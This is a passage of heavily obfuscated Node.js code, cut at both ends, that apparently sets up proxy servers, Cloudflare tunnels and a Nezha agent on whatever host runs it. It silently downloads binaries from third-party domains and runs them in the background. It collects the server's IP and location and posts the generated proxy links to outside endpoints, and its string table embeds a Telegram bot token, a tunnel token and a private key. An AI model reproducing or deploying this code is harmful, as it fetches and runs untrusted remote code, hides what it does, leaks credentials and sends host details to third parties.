      fs[_0x38ec3f(0x2bb)](path[_0x38ec3f(_0x408168._0x6ceeb6)](FILE_PATH, _0x38ec3f(_0x408168._0x108c7d)), _0x283598)
      const _0xe7aad2 = 'nohup\x20' + phpPath + _0x38ec3f(_0x408168._0x17f06f) + FILE_PATH + _0x38ec3f(0x287)
      try {
        ;(await exec(_0xe7aad2),
          console[_0x38ec3f(_0x408168._0x60356c)](phpName + _0x38ec3f(_0x408168._0x41ae41)),
          await new Promise((_0x105d26) => setTimeout(_0x105d26, 0x3e8)))
      } catch (_0x5e0b64) {
        console[_0x38ec3f(_0x408168._0x440943)](_0x38ec3f(_0x408168._0x2322ed) + _0x5e0b64)
      }
    } else {
      let _0x3faef1 = ''
      const _0x4bb7ea = [_0x38ec3f(0x2a0), '8443', _0x38ec3f(_0x408168._0x4c3f15), _0x38ec3f(_0x408168._0x766d11), _0x38ec3f(0x1d7), _0x38ec3f(0x2cd)]
      _0x4bb7ea[_0x38ec3f(_0x408168._0x42880c)](NEZHA_PORT) && (_0x3faef1 = '--tls')
      const _0x46882c =
        _0x38ec3f(_0x408168._0x5bba13) +
        npmPath +
        _0x38ec3f(_0x408168._0x5f09d2) +
        NEZHA_SERVER +
        ':' +
        NEZHA_PORT +
        _0x38ec3f(_0x408168._0x2cdc4e) +
        NEZHA_KEY +
        '\x20' +
        _0x3faef1 +
        _0x38ec3f(_0x408168._0x55e50e)
      try {
        ;(await exec(_0x46882c),
          console[_0x38ec3f(_0x408168._0x60356c)](npmName + _0x38ec3f(_0x408168._0x41ae41)),
          await new Promise((_0x408e85) => setTimeout(_0x408e85, 0x3e8)))
      } catch (_0x271b66) {
        console[_0x38ec3f(_0x408168._0x440943)]('npm\x20running\x20error:\x20' + _0x271b66)
      }
    }
  } else console[_0x38ec3f(_0x408168._0x60356c)](_0x38ec3f(0x284))
  const _0x2fe72e = _0x38ec3f(_0x408168._0x5bba13) + webPath + _0x38ec3f(_0x408168._0x193889) + FILE_PATH + _0x38ec3f(0x2dc)
  try {
    ;(await exec(_0x2fe72e), console['log'](webName + _0x38ec3f(0x2dd)), await new Promise((_0x526039) => setTimeout(_0x526039, 0x3e8)))
  } catch (_0x3d5652) {
    console['error']('web\x20running\x20error:\x20' + _0x3d5652)
  }
  if (fs[_0x38ec3f(0x2e3)](botPath)) {
    let _0x3cacd2
    if (ARGO_AUTH[_0x38ec3f(_0x408168._0x271c79)](/^[A-Z0-9a-z=]{120,250}$/)) _0x3cacd2 = _0x38ec3f(_0x408168._0x290d2b) + ARGO_AUTH
    else
      ARGO_AUTH[_0x38ec3f(_0x408168._0x507847)](/TunnelSecret/)
        ? (_0x3cacd2 = _0x38ec3f(_0x408168._0x205832) + path[_0x38ec3f(0x2ce)](FILE_PATH, _0x38ec3f(_0x408168._0x2421a2)) + _0x38ec3f(0x2ac))
        : (_0x3cacd2 =
            _0x38ec3f(_0x408168._0x49c947) +
            path[_0x38ec3f(_0x408168._0x2460c4)](bootLogPath) +
            '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:' +
            ARGO_PORT)
    try {
      ;(await exec(_0x38ec3f(0x29e) + path[_0x38ec3f(0x2ce)](botPath) + '\x22\x20' + _0x3cacd2 + _0x38ec3f(0x20c)),
        console[_0x38ec3f(0x26b)](botName + '\x20is\x20running'),
        await new Promise((_0x1aff71) => setTimeout(_0x1aff71, 0x7d0)))
    } catch (_0x1f003e) {
      console[_0x38ec3f(0x1c7)]('Error\x20executing\x20command:\x20' + _0x1f003e)
    }
  }
  await new Promise((_0x49e117) => setTimeout(_0x49e117, 0x1388))
}
function getFilesForArchitecture(_0x4a8d80) {
  const _0x8392b1 = { _0xecd100: 0x2be, _0x72cf8b: 0x1eb, _0x5d5124: 0x20e },
    _0x47fc62 = _0x475425,
    _0x3060ee = _0x4a8d80 === _0x47fc62(0x2be) ? 'https://arm64.oooen.com' : _0x47fc62(0x26d),
    _0x9ea938 = _0x4a8d80 === _0x47fc62(_0x8392b1._0xecd100) ? 'https://arm64.ssss.nyc.mn' : 'https://amd64.ssss.nyc.mn',
    _0x3605b4 = [
      { fileName: webPath, fileUrls: [_0x3060ee + _0x47fc62(_0x8392b1._0x72cf8b), _0x9ea938 + '/web'] },
      { fileName: botPath, fileUrls: [_0x3060ee + '/bot', _0x9ea938 + _0x47fc62(0x1ea)] }
    ]
  return (
    NEZHA_SERVER &&
      NEZHA_KEY &&
      (NEZHA_PORT
        ? _0x3605b4[_0x47fc62(0x245)]({ fileName: npmPath, fileUrls: [_0x3060ee + _0x47fc62(_0x8392b1._0x5d5124), _0x9ea938 + _0x47fc62(0x20e)] })
        : _0x3605b4[_0x47fc62(0x245)]({ fileName: phpPath, fileUrls: [_0x3060ee + '/v1', _0x9ea938 + '/v1'] })),
    _0x3605b4
  )
}
function argoType() {
  const _0xee5f02 = {
      _0x5ce82c: 0x26b,
      _0xc40820: 0x222,
      _0x5e22cd: 0x1d0,
      _0x388196: 0x2e1,
      _0x234924: 0x22e,
      _0x5de99e: 0x28a,
      _0x3871a6: 0x2ae,
      _0x2538b1: 0x235,
      _0x33f0c7: 0x27d
    },
    _0x468436 = _0x475425
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console[_0x468436(_0xee5f02._0x5ce82c)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20is\x20empty,\x20use\x20quick\x20tunnels')
    return
  }
  if (ARGO_AUTH[_0x468436(0x25f)](_0x468436(0x211))) {
    fs[_0x468436(0x2bb)](path[_0x468436(0x2e1)](FILE_PATH, _0x468436(_0xee5f02._0xc40820)), ARGO_AUTH)
    const _0x29682c =
      _0x468436(0x278) +
      ARGO_AUTH[_0x468436(0x1f7)]('\x22')[0xb] +
      _0x468436(_0xee5f02._0x5e22cd) +
      path[_0x468436(_0xee5f02._0x388196)](FILE_PATH, _0x468436(0x222)) +
      '\x0a\x20\x20protocol:\x20http2\x0a\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20' +
      ARGO_DOMAIN +
      _0x468436(_0xee5f02._0x234924) +
      ARGO_PORT +
      _0x468436(_0xee5f02._0x5de99e)
    fs[_0x468436(0x2bb)](path[_0x468436(_0xee5f02._0x388196)](FILE_PATH, _0x468436(_0xee5f02._0x3871a6)), _0x29682c)
  } else console['log'](_0x468436(_0xee5f02._0x2538b1) + ARGO_PORT + _0x468436(_0xee5f02._0x33f0c7))
}
async function waitForQuickTunnelLog(_0x3e7cf2 = 0x7530) {
  const _0x51b917 = { _0xee4b2a: 0x2ad, _0x53e3ef: 0x2e3, _0x5ca3c6: 0x1e3, _0x2f41df: 0x248 },
    _0x2848a2 = _0x475425,
    _0x3c661d = Date['now']() + _0x3e7cf2
  while (Date[_0x2848a2(_0x51b917._0xee4b2a)]() < _0x3c661d) {
    try {
      if (fs[_0x2848a2(_0x51b917._0x53e3ef)](bootLogPath)) {
        const _0x2891c6 = fs[_0x2848a2(_0x51b917._0x5ca3c6)](bootLogPath, _0x2848a2(_0x51b917._0x2f41df))
        if (/trycloudflare\.com/['test'](_0x2891c6)) return _0x2891c6
      }
    } catch (_0x1ec418) {}
    await new Promise((_0x453b64) => setTimeout(_0x453b64, 0x3e8))
  }
  return ''
}
async function extractDomains() {
  const _0x31c3b4 = {
      _0x567e05: 0x212,
      _0x38820e: 0x26b,
      _0x514768: 0x2ce,
      _0x52dc7a: 0x2e7,
      _0x3c89e6: 0x29e,
      _0x11378f: 0x26b,
      _0x286177: 0x2d5,
      _0xee7eec: 0x1c7
    },
    _0x379b80 = { _0x2645e3: 0x23e, _0xdd0384: 0x1f9, _0x54e129: 0x296, _0xd55c37: 0x298 },
    _0x4e54f1 = { _0x14c477: 0x238 },
    _0x12253d = _0x475425
  let _0x3b26aa
  if (ARGO_AUTH && ARGO_DOMAIN) ((_0x3b26aa = ARGO_DOMAIN), console['log'](_0x12253d(0x1e6), _0x3b26aa), await generateLinks(_0x3b26aa))
  else
    try {
      const _0x4c3d6d = await waitForQuickTunnelLog(),
        _0x5b798c = _0x4c3d6d['split']('\x0a'),
        _0x42588b = []
      _0x5b798c['forEach']((_0x1a0f43) => {
        const _0x25fccb = _0x12253d,
          _0x58f9fd = _0x1a0f43[_0x25fccb(_0x4e54f1._0x14c477)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
        if (_0x58f9fd) {
          const _0x1baf4c = _0x58f9fd[0x1]
          _0x42588b[_0x25fccb(0x219)](_0x1baf4c)
        }
      })
      if (_0x42588b[_0x12253d(0x2b0)] > 0x0)
        ((_0x3b26aa = _0x42588b[0x0]), console['log'](_0x12253d(_0x31c3b4._0x567e05), _0x3b26aa), await generateLinks(_0x3b26aa))
      else {
        ;(console[_0x12253d(_0x31c3b4._0x38820e)](_0x12253d(0x2e2)), fs[_0x12253d(0x206)](path[_0x12253d(0x2e1)](FILE_PATH, _0x12253d(0x2c7))))
        async function _0xd7ef69() {
          const _0x59640c = _0x12253d
          try {
            process['platform'] === _0x59640c(_0x379b80._0x2645e3)
              ? await exec(_0x59640c(0x225) + botName + _0x59640c(_0x379b80._0xdd0384))
              : await exec(
                  'pkill\x20-f\x20\x22[' +
                    botName[_0x59640c(_0x379b80._0x54e129)](0x0) +
                    ']' +
                    botName[_0x59640c(_0x379b80._0xd55c37)](0x1) +
                    _0x59640c(0x23c)
                )
          } catch (_0x25fa3c) {}
        }
        ;(_0xd7ef69(), await new Promise((_0x55e982) => setTimeout(_0x55e982, 0xbb8)))
        const _0x183839 =
          'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22' +
          path[_0x12253d(_0x31c3b4._0x514768)](bootLogPath) +
          _0x12253d(_0x31c3b4._0x52dc7a) +
          ARGO_PORT
        try {
          ;(await exec(_0x12253d(_0x31c3b4._0x3c89e6) + path[_0x12253d(0x2ce)](botPath) + '\x22\x20' + _0x183839 + '\x20>/dev/null\x202>&1\x20&'),
            console[_0x12253d(_0x31c3b4._0x11378f)](botName + '\x20is\x20running'),
            await new Promise((_0x23ba52) => setTimeout(_0x23ba52, 0x1770)),
            await extractDomains())
        } catch (_0xa77aff) {
          console['error'](_0x12253d(_0x31c3b4._0x286177) + _0xa77aff)
        }
      }
    } catch (_0x487b37) {
      console[_0x12253d(_0x31c3b4._0xee7eec)](_0x12253d(0x250), _0x487b37)
    }
}
async function getMetaInfo() {
  const _0x3743bc = {
      _0x139934: 0x1de,
      _0x1e4b42: 0x2e0,
      _0x86f2b4: 0x241,
      _0x535fcb: 0x1db,
      _0x23fe25: 0x2cf,
      _0x11966a: 0x291,
      _0x4f4d2a: 0x25a,
      _0x5be488: 0x241,
      _0x504dcb: 0x1fb,
      _0xcb62ad: 0x241
    },
    _0x3fe2f2 = _0x475425
  try {
    const _0xcadca7 = await axios['get'](_0x3fe2f2(_0x3743bc._0x139934), {
      headers: { 'User-Agent': _0x3fe2f2(_0x3743bc._0x1e4b42), timeout: 0xbb8 }
    })
    if (
      _0xcadca7[_0x3fe2f2(_0x3743bc._0x86f2b4)] &&
      _0xcadca7[_0x3fe2f2(_0x3743bc._0x86f2b4)]['country_code'] &&
      _0xcadca7[_0x3fe2f2(_0x3743bc._0x86f2b4)][_0x3fe2f2(0x2cf)]
    )
      return (_0xcadca7[_0x3fe2f2(0x241)][_0x3fe2f2(_0x3743bc._0x535fcb)] + '-' + _0xcadca7['data'][_0x3fe2f2(_0x3743bc._0x23fe25)])['replace'](
        /\s+/g,
        '_'
      )
  } catch (_0x46fa80) {
    try {
      const _0x2ade96 = await axios[_0x3fe2f2(_0x3743bc._0x11966a)](_0x3fe2f2(_0x3743bc._0x4f4d2a), {
        headers: { 'User-Agent': _0x3fe2f2(0x2e0), timeout: 0xbb8 }
      })
      if (
        _0x2ade96[_0x3fe2f2(_0x3743bc._0x5be488)] &&
        _0x2ade96[_0x3fe2f2(_0x3743bc._0x5be488)][_0x3fe2f2(_0x3743bc._0x504dcb)] === 'success' &&
        _0x2ade96[_0x3fe2f2(0x241)]['countryCode'] &&
        _0x2ade96[_0x3fe2f2(_0x3743bc._0xcb62ad)][_0x3fe2f2(0x2d3)]
      )
        return (_0x2ade96[_0x3fe2f2(0x241)]['countryCode'] + '-' + _0x2ade96[_0x3fe2f2(_0x3743bc._0x86f2b4)]['org'])['replace'](/\s+/g, '_')
    } catch (_0x1815ad) {}
  }
  return 'Unknown'
}
async function getServerIP() {
  const _0x582880 = { _0x45d9a9: 0x259, _0x3ca620: 0x1fe, _0x5cd37b: 0x237, _0x628391: 0x1f8, _0x1e143a: 0x285 },
    _0x2aac21 = _0x475425
  let _0x5326ae = ''
  try {
    const _0x30cb27 = await axios['get'](_0x2aac21(_0x582880._0x45d9a9), { timeout: 0xbb8 })
    _0x5326ae = _0x30cb27['data'][_0x2aac21(0x1f8)]()
  } catch (_0x2ef18e) {
    try {
      _0x5326ae = execSync(_0x2aac21(_0x582880._0x3ca620))[_0x2aac21(0x243)]()[_0x2aac21(0x1f8)]()
    } catch (_0x98bd69) {
      try {
        const _0xd7a24a = await axios['get'](_0x2aac21(_0x582880._0x5cd37b), { timeout: 0xbb8 })
        _0x5326ae = '[' + _0xd7a24a['data'][_0x2aac21(_0x582880._0x628391)]() + ']'
      } catch (_0x3e2ed1) {
        try {
          _0x5326ae = '[' + execSync('curl\x20-sm\x203\x20ipv6.ip.sb')[_0x2aac21(0x243)]()[_0x2aac21(_0x582880._0x628391)]() + ']'
        } catch (_0x1bd582) {
          console[_0x2aac21(0x1c7)](_0x2aac21(_0x582880._0x1e143a), _0x1bd582[_0x2aac21(0x264)])
        }
      }
    }
  }
  return _0x5326ae
}
function _0x1ccb() {
  const _0x289ee8 = [
    '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20',
    'http\x20server\x20is\x20running\x20on\x20',
    'util',
    'mfa.gov.ua',
    '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a',
    'listen',
    '7575949494',
    'get',
    'reality',
    'writeHead',
    '953826ZzttqZ',
    '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20',
    'charAt',
    '8962228750:AAGlYPI5a4FVgx0-gUbB383JirHhkuqbwRE',
    'substring',
    'AUTO_ACCESS',
    'post',
    'response',
    'publicKey',
    '21455770sWsYjd',
    'nohup\x20\x22',
    'update',
    '443',
    'vless',
    'rm\x20-rf\x20',
    'quic',
    'vless-fallback-in',
    'close',
    '128989jFrVNI',
    'fileUrls',
    '\x20-c\x20',
    'map',
    'utf8',
    'PROJECT_URL',
    '\x22\x20run',
    'now',
    'tunnel.yml',
    'CHAT_ID',
    'length',
    'pkcs8',
    'hysteria',
    '\x0avless://',
    'slice',
    'Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture',
    '20984rkRrAZ',
    'CFIP',
    'BOT_TOKEN',
    'MarkdownV2',
    'UPLOAD_URL',
    'writeFileSync',
    '/vless-argo',
    'true',
    'arm',
    'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0a',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22',
    'isFile',
    'freedom',
    'text/plain;\x20charset=utf-8',
    '/dev/null',
    'Failed\x20to\x20calculate\x20certificate\x20fingerprint:',
    'ARGO_PORT',
    'boot.log',
    'statSync',
    'from',
    '?encryption=none&security=tls&sni=',
    '\x5c$&',
    '\x20>/dev/null\x202>&1',
    '2053',
    'resolve',
    'isp',
    'direct',
    'unlink',
    'renameSync',
    'org',
    '\x0a\x0atrojan://',
    'Error\x20executing\x20command:\x20',
    'Error\x20downloading\x20files:',
    '\x0asocks://',
    'NAME',
    'vless-ws-in',
    '2EPEdTw',
    'false',
    '/config.json\x20>/dev/null\x202>&1\x20&',
    '\x20is\x20running',
    '\x20-p\x20',
    'stream',
    'Mozilla/5.0',
    'join',
    'ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain',
    'existsSync',
    '8443',
    'UUID',
    'vmess-ws-in',
    '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:',
    'readdirSync',
    'Subscription\x20uploaded\x20successfully',
    'mkdirSync',
    'fileName',
    'clear',
    'finish',
    'createServer',
    'url',
    'has',
    'ARGO_AUTH',
    'https://api.telegram.org/bot',
    'Telegram\x20message\x20sent\x20successfully',
    'key.txt',
    'error',
    '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',
    '\x22\x20-subj\x20\x22/CN=bing.com\x22',
    'PORT',
    'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0a',
    'platform',
    'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0a',
    'then',
    'del\x20/f\x20/q\x20',
    '\x0a\x20\x20credentials-file:\x20',
    'basename',
    'toUpperCase',
    'privateKey',
    'Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!',
    '\x20failed:\x20',
    'vless-tcp-in',
    '2083',
    '/vmess-argo',
    '5013654JxsITm',
    'socks',
    'country_code',
    'random',
    'replace',
    'https://api.ip.sb/geoip',
    '&type=tcp&headerType=none#',
    'Download\x20',
    '180233cd-22c9-4144-a559-012e45986dd6',
    '800',
    'readFileSync',
    'spki',
    'Private\x20Key:',
    'ARGO_DOMAIN:',
    'openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22',
    'Empowerment\x20failed\x20for\x20',
    'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0a',
    '/bot',
    '/web',
    'firefox',
    'https://oooo.serv00.net/add-url',
    '/sub.txt\x20saved\x20successfully',
    'stringify',
    'sub.txt',
    'https+local://8.8.8.8/dns-query',
    'sha256',
    '-----END\x20CERTIFICATE-----\x0a',
    '570vYuqVH',
    'env',
    '127.0.0.1',
    'split',
    'trim',
    '.exe\x20>\x20nul\x202>&1',
    'base64url',
    'status',
    'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a',
    'PrivateKey:\x20',
    'curl\x20-sm\x203\x20ipv4.ip.sb',
    'createHash',
    'SHOW_LOG',
    'arm64',
    '-----BEGIN\x20CERTIFICATE-----\x0a',
    '/api/add-nodes',
    'auto',
    '&path=%2Fvless-argo%3Fed%3D2560#',
    'unlinkSync',
    'arch',
    'floor',
    'ignore',
    '\x0aPublicKey:\x20',
    'inbounds',
    '\x20>/dev/null\x202>&1\x20&',
    '\x20from\x20backup\x20source',
    '/agent',
    'child_process',
    'private.key',
    'TunnelSecret',
    'ArgoDomain:',
    'hex',
    '?security=tls&sni=',
    'automatic\x20access\x20task\x20added\x20successfully',
    'openssl\x20x509\x20-noout\x20-fingerprint\x20-sha256\x20-in\x20\x22',
    'der',
    's5-in',
    'push',
    'subarray',
    '-----BEGIN\x20EC\x20PARAMETERS-----\x0a',
    '/api/delete-nodes',
    'string',
    'x25519',
    'cert.pem',
    'base64',
    'nohup\x20',
    'tunnel.json',
    'block',
    '\x20-s\x20',
    'taskkill\x20/f\x20/im\x20',
    'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0a',
    'crypto',
    '2087',
    'pipe',
    '\x20successfully',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20',
    'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a',
    '/trojan-argo',
    '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:',
    'tcp',
    'openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22',
    'config.json',
    '/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none',
    '?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=',
    'NEZHA_KEY',
    'Using\x20token\x20connect\x20to\x20tunnel,\x20please\x20set\x20',
    'Skipping\x20adding\x20automatic\x20access\x20task',
    'http://ipv6.ip.sb',
    'match',
    'tls',
    'http',
    'trojan',
    '\x22\x20>\x20/dev/null\x202>&1',
    'config.yaml',
    'win32',
    'vless-in',
    'xtls-rprx-vision',
    'data',
    '583350VmRFWR',
    'toString',
    'path',
    'unshift',
    '/api/add-subscriptions',
    '2096',
    'utf-8',
    'toLowerCase',
    'amd',
    'FILE_PATH',
    'php\x20running\x20error:\x20',
    'proxy',
    'end',
    'trojan-ws-in',
    'Error\x20reading\x20boot.log:',
    '/vmess-argo?ed=2560',
    'disable',
    'HY2_PORT',
    '&fp=firefox&type=ws&host=',
    '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20',
    '-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0a',
    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiYWU2ZDIyN2MtMWRmZi00MjA2LWEyYWMtODI0MmRmNTZkMjdlIiwicyI6Ik1UQXlZalpsTnpjdFpEVTJZeTAwWm1OaExXRXpNemd0TVRFMll6Z3hZVFUwTkRWayJ9',
    'filter',
    'http://ipv4.ip.sb',
    'http://ip-api.com/json',
    'www.iij.ad.jp:443',
    '1564036aTfNtL',
    'generateKeyPairSync',
    'Failed\x20to\x20send\x20Telegram\x20message:',
    'includes',
    'application/json',
    '&path=%2Ftrojan-argo%3Fed%3D2560#',
    '\x20-c\x20\x22',
    'catch',
    'message',
    'readFile',
    '节点推送**\x0a```',
    'export',
    'digest',
    'password',
    'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0a',
    'log',
    'tunnel\x20--edge-ip-version\x20auto\x20--config\x20\x22',
    'https://amd64.oooen.com',
    '-----END\x20EC\x20PRIVATE\x20KEY-----\x0a',
    'Not\x20Found',
    'Error\x20in\x20startserver:',
    'openssl\x20version',
    '\x0a\x0avmess://',
    '1719JCHOAg',
    'promises',
    'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',
    'text/html;\x20charset=utf-8',
    'axios',
    '\x0a\x20\x20tunnel:\x20',
    'none',
    'ARGO_DOMAIN',
    'forEach',
    '/sendMessage',
    '\x20in\x20clouudflare',
    'S5_PORT',
    'Unhandled\x20error\x20in\x20startserver:',
    'dirname',
    'raw',
    'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0a',
    '\x0a\x20\x20\x20\x20',
    'NEZHA\x20variable\x20is\x20empty,skip\x20running',
    'Failed\x20to\x20get\x20IP\x20address:',
    'https://bing.com',
    '/config.yaml\x22\x20>/dev/null\x202>&1\x20&',
    'App\x20is\x20running',
    '.download'
  ]
  _0x1ccb = function () {
    return _0x289ee8
  }
  return _0x1ccb()
}
async function generateLinks(_0x2112b5) {
  const _0x40b2d5 = await getMetaInfo(),
    _0x78a46c = NAME ? NAME + '-' + _0x40b2d5 : _0x40b2d5,
    _0x4e0bf0 = await getServerIP()
  return new Promise((_0x3a920b) => {
    const _0x2c0639 = {
      _0x46c46a: 0x204,
      _0x27b248: 0x251,
      _0x4f647c: 0x1ec,
      _0x14dba9: 0x2ca,
      _0x4e4672: 0x254,
      _0x1f4ad5: 0x205,
      _0x5ad1ed: 0x220,
      _0x38e6aa: 0x2d4,
      _0x5015c5: 0x214,
      _0x25d8f4: 0x254,
      _0x537748: 0x283,
      _0x549108: 0x232,
      _0x49e7d2: 0x1df,
      _0x1c3cd5: 0x2c9,
      _0x4c12aa: 0x220,
      _0x3cd831: 0x2bb,
      _0x25a513: 0x243,
      _0x4f7feb: 0x220
    }
    setTimeout(() => {
      const _0x41c7d4 = _0x35ff,
        _0x346230 = {
          v: '2',
          ps: '' + _0x78a46c,
          add: CFIP,
          port: CFPORT,
          id: UUID,
          aid: '0',
          scy: _0x41c7d4(_0x2c0639._0x46c46a),
          net: 'ws',
          type: _0x41c7d4(0x279),
          host: _0x2112b5,
          path: _0x41c7d4(_0x2c0639._0x27b248),
          tls: _0x41c7d4(0x239),
          sni: _0x2112b5,
          alpn: '',
          fp: _0x41c7d4(_0x2c0639._0x4f647c)
        }
      let _0xd5fde7 =
        '\x0avless://' +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        _0x41c7d4(_0x2c0639._0x14dba9) +
        _0x2112b5 +
        _0x41c7d4(_0x2c0639._0x4e4672) +
        _0x2112b5 +
        _0x41c7d4(_0x2c0639._0x1f4ad5) +
        _0x78a46c +
        _0x41c7d4(0x272) +
        Buffer[_0x41c7d4(0x2c9)](JSON['stringify'](_0x346230))[_0x41c7d4(0x243)](_0x41c7d4(_0x2c0639._0x5ad1ed)) +
        _0x41c7d4(_0x2c0639._0x38e6aa) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        _0x41c7d4(_0x2c0639._0x5015c5) +
        _0x2112b5 +
        _0x41c7d4(_0x2c0639._0x25d8f4) +
        _0x2112b5 +
        _0x41c7d4(0x261) +
        _0x78a46c +
        _0x41c7d4(_0x2c0639._0x537748)
      if (isValidPort(HY2_PORT)) {
        const _0x176412 = getCertificateFingerprint(certPath),
          _0x48fff0 = _0x176412 ? '&pinSHA256=' + encodeURIComponent(_0x176412) : '',
          _0x4014f2 = '\x0ahysteria2://' + UUID + '@' + _0x4e0bf0 + ':' + HY2_PORT + _0x41c7d4(_0x2c0639._0x549108) + _0x48fff0 + '#' + _0x78a46c
        _0xd5fde7 += _0x4014f2
      }
      if (isValidPort(REALITY_PORT)) {
        const _0x59b087 =
          _0x41c7d4(0x2b3) + UUID + '@' + _0x4e0bf0 + ':' + REALITY_PORT + _0x41c7d4(0x233) + publicKey + _0x41c7d4(_0x2c0639._0x49e7d2) + _0x78a46c
        _0xd5fde7 += _0x59b087
      }
      if (isValidPort(S5_PORT)) {
        const _0x147d69 = Buffer[_0x41c7d4(_0x2c0639._0x1c3cd5)](UUID['substring'](0x0, 0x8) + ':' + UUID[_0x41c7d4(0x2b4)](-0xc))[_0x41c7d4(0x243)](
            'base64'
          ),
          _0xa82323 = _0x41c7d4(0x2d7) + _0x147d69 + '@' + _0x4e0bf0 + ':' + S5_PORT + '#' + _0x78a46c
        _0xd5fde7 += _0xa82323
      }
      ;(console[_0x41c7d4(0x26b)](Buffer[_0x41c7d4(0x2c9)](_0xd5fde7)[_0x41c7d4(0x243)](_0x41c7d4(_0x2c0639._0x4c12aa))),
        fs[_0x41c7d4(_0x2c0639._0x3cd831)](subPath, Buffer['from'](_0xd5fde7)[_0x41c7d4(_0x2c0639._0x25a513)]('base64')),
        fs[_0x41c7d4(_0x2c0639._0x3cd831)](listPath, _0xd5fde7, 'utf8'),
        console[_0x41c7d4(0x26b)](FILE_PATH + _0x41c7d4(0x1ee)),
        (subContent = Buffer[_0x41c7d4(_0x2c0639._0x1c3cd5)](_0xd5fde7)[_0x41c7d4(_0x2c0639._0x25a513)](_0x41c7d4(_0x2c0639._0x4f7feb))),
        uploadNodes(),
        _0x3a920b(_0xd5fde7))
    }, 0x7d0)
  })
}
async function uploadNodes() {
  const _0x34b1c2 = { _0x3dcfb6: 0x1fb, _0x3e8341: 0x26b, _0x300f68: 0x2e3, _0x244c46: 0x1e3, _0x3e89c8: 0x203, _0x13ad16: 0x260, _0x41dd32: 0x1fb },
    _0x5ab5cd = _0x475425
  if (UPLOAD_URL && PROJECT_URL) {
    const _0x521bbb = PROJECT_URL + '/' + SUB_PATH,
      _0x445674 = { subscription: [_0x521bbb] }
    try {
      const _0x119fc7 = await axios[_0x5ab5cd(0x29a)](UPLOAD_URL + _0x5ab5cd(0x246), _0x445674, { headers: { 'Content-Type': 'application/json' } })
      return _0x119fc7 && _0x119fc7[_0x5ab5cd(_0x34b1c2._0x3dcfb6)] === 0xc8
        ? (console[_0x5ab5cd(_0x34b1c2._0x3e8341)](_0x5ab5cd(0x2e9)), _0x119fc7)
        : null
    } catch (_0x21dbf3) {
      if (_0x21dbf3[_0x5ab5cd(0x29b)]) {
        if (_0x21dbf3['response'][_0x5ab5cd(_0x34b1c2._0x3dcfb6)] === 0x190) {
        }
      }
    }
  } else {
    if (UPLOAD_URL) {
      if (!fs[_0x5ab5cd(_0x34b1c2._0x300f68)](listPath)) return
      const _0x4a036a = fs[_0x5ab5cd(_0x34b1c2._0x244c46)](listPath, 'utf-8'),
        _0x505ce0 = _0x4a036a[_0x5ab5cd(0x1f7)]('\x0a')[_0x5ab5cd(0x258)]((_0x1756e6) =>
          /(vless|vmess|trojan|hysteria2|socks):\/\//['test'](_0x1756e6)
        )
      if (_0x505ce0['length'] === 0x0) return
      const _0xa19e37 = JSON[_0x5ab5cd(0x1ef)]({ nodes: _0x505ce0 })
      try {
        const _0x48bc81 = await axios['post'](UPLOAD_URL + _0x5ab5cd(_0x34b1c2._0x3e89c8), _0xa19e37, {
          headers: { 'Content-Type': _0x5ab5cd(_0x34b1c2._0x13ad16) }
        })
        return _0x48bc81 && _0x48bc81[_0x5ab5cd(_0x34b1c2._0x41dd32)] === 0xc8
